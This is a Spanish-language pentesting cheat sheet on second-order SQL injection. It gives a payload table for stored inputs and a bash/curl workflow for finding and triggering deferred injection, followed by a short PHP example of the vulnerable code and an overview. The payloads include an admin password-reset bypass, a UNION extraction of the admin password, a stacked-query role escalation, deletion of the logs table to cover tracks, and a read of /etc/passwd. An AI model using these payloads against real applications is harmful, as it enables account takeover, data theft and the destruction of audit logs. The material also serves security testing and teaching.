---
aliases:
  - Second-order SQLi
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[SQL Injection (SQLi)]]'
---
# SQLi - Second order

***

## Cheatsheet

| **Payload (registrado)** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Registrar user con username `admin'-- -` | Login posterior con ese username concatena en update/select → bypass o data leak | App con prepared en INSERT pero concat en otras queries. |
| Registrar user `' UNION SELECT password,NULL,NULL FROM users WHERE username='admin'-- -` | UNION dispara cuando endpoint posterior lee username crudo | Endpoint que pasa username sin sanitizar. |
| Email registro `a@a.com'; UPDATE users SET role='admin' WHERE username='ATACANTE'-- -` | Stacked query dispara al usar email en query state-changing | Backend permite stacked queries en endpoint diferido. |
| Bio/profile `'; DELETE FROM logs-- -` | Cleanup de logs cuando profile se renderiza | App renderiza bio sin escape en logging query. |
| Password reset → `username='admin'-- -` | Reset triggera `WHERE username='admin'-- ...'` → reset password de admin | Endpoint `forgot password` con username concat. |
| Nombre archivo upload `'; SELECT load_file('/etc/passwd')-- -` | Filename usado en query de metadata posterior dispara la carga | App guarda filename en DB + endpoint reporting concat. |
| Comment `' OR sleep(5)-- -` | Blind via time delay cuando admin ve el comment | Blind variant — admin panel lee comment sin escape. |
^sqli-second

### Workflow identificación

```bash
TARGET="https://target"

# 1. Mapear inputs persistidos
#    - Registro: username, email, profile fields
#    - Comments, posts, mensajes
#    - Uploads (filename)

# 2. Inyectar marker observable
# Usar payload que NO rompe la primera transacción (INSERT con prepared):
MARKER="MARKER_$(date +%s)' OR sleep(5)-- -"
curl -X POST "$TARGET/register" -d "username=$MARKER&password=x&email=x@x.com"

# 3. Triggerear funciones que leen ese dato
ENDPOINTS=(
  "/profile/$MARKER"
  "/forgot-password"  # con email del marker
  "/admin/users"      # admin panel lista users
  "/api/search?q=$MARKER"
)

for ep in "${ENDPOINTS[@]}"; do
  T=$(curl -s -o /dev/null -w '%{time_total}' "$TARGET$ep")
  echo "[$T s] $ep"
done
# Endpoint con delay = vector vulnerable

# 4. Refinar payload — extraer data via time-based blind o OOB
```

### Por qué pasa

```php
// Registro — PREPARED (seguro)
$stmt = $pdo->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
$stmt->execute([$username, $password]);  // payload guardado tal cual

// Reset password — CONCAT (vulnerable)
$user = getUserById($id);              // ← username = "admin'-- -"
$query = "UPDATE users SET password='newpass' WHERE username='" . $user->username . "'";
$pdo->query($query);
// Resulting query: UPDATE users SET password='newpass' WHERE username='admin'-- -'
//                                                                  ^^^^^^^^^^^^^ admin's password reseteado
```

___

## Overview

**Second-order SQLi** = payload se guarda inerte en DB en primera transacción (con prepared statement). Detona después cuando otro endpoint lee ese valor y lo concatena sin escapar.

**Vector latente** — no se detecta con scanners típicos que prueban respuesta inmediata. Requiere:
1. Identificar inputs que se persisten en DB.
2. Mapear endpoints que leen esos datos.
3. Diferencia de tratamiento: prepared en INSERT vs concat en SELECT/UPDATE.

**Indicador clave**: app trusts data "from own DB" como segura. Vector típico en passwords reset, admin panels, scheduled jobs, reporting.

***
